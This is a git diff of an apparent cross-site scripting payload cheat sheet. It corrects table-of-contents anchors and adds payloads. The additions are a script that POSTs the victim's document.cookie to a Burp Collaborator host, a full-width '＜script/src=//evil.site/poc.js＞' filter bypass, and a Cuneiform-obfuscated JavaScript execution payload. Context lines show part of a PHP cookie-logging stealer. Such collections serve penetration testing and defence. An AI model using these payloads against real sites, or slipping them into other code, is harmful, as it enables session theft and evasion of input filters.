@@ -37,26 +37,27 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass dot filter](#bypass-dot-filter)
   - [Bypass parenthesis for string](#bypass-parenthesis-for-string)
   - [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
-  - [Bypass onxxxx= blacklist](#bypass-onxxxx---blacklist)
+  - [Bypass onxxxx= blacklist](#bypass-onxxxx-blacklist)
   - [Bypass space filter](#bypass-space-filter)
   - [Bypass email filter](#bypass-email-filter)
   - [Bypass document blacklist](#bypass-document-blacklist)
   - [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
-  - [Bypass using an alternate way to redirect](#bypass-unsing-an-alternate-way-to-redirect)
+  - [Bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
   - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
-  - [Bypass ">" using nothing](#bypass----using-nothing)
-  - [Bypass "<" using ＜](#bypass----using-＜)
-  - [Bypass ";" using another character](#bypass-using------using-another-character)
+  - [Bypass ">" using nothing](#bypass--using-nothing)
+  - [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
+  - [Bypass ";" using another character](#bypass--using-another-character)
   - [Bypass using HTML encoding](#bypass-using-html-encoding)
   - [Bypass using Katana](#bypass-using-katana)
+  - [Bypass using Cuneiform](#bypass-using-cuneiform)
   - [Bypass using Lontara](#bypass-using-lontara)
   - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
   - [Bypass using Octal encoding](#bypass-using-octal-encoding)
   - [Bypass using Unicode](#bypass-using-unicode)
-  - [Bypass using UTF-7](#bypass-using-utf---7)
-  - [Bypass using UTF-8](#bypass-using-utf---8)
-  - [Bypass using UTF-16be](#bypass-using-utf---16be)
-  - [Bypass using UTF-32](#bypass-using-utf---32)
+  - [Bypass using UTF-7](#bypass-using-utf-7)
+  - [Bypass using UTF-8](#bypass-using-utf-8)
+  - [Bypass using UTF-16be](#bypass-using-utf-16be)
+  - [Bypass using UTF-32](#bypass-using-utf-32)
   - [Bypass using BOM](#bypass-using-bom)
   - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
   - [Bypass using jsfuck](#bypass-using-jsfuck)
@@ -87,6 +88,18 @@ $fp = fopen('cookies.txt', 'a+');
 fwrite($fp, 'Cookie:' .$cookie."\r\n");
 fclose($fp);
 ?>
+```
+
+### CORS
+
+```html
+<script>
+  fetch('https://<SESSION>.burpcollaborator.net', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
 ```
 
 ### UI redressing
@@ -792,10 +805,12 @@ You don't need to close your tags.
 <svg onload=alert(1)//
 ```
 
-### Bypass "<" using ＜
+### Bypass "<" and ">" using ＜ and ＞
+
+Unicode Character U+FF1C and U+FF1E
 
 ```javascript
-[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+＜script/src=//evil.site/poc.js＞
 ```
 
 ### Bypass ";" using another character
@@ -832,6 +847,15 @@ Using the [Katakana](https://github.com/aemkei/katakana.js) library.
 
 ```javascript
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+```
+
+### Bypass using Cuneiform
+
+```javascript
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
 ```
 
 ### Bypass using Lontara
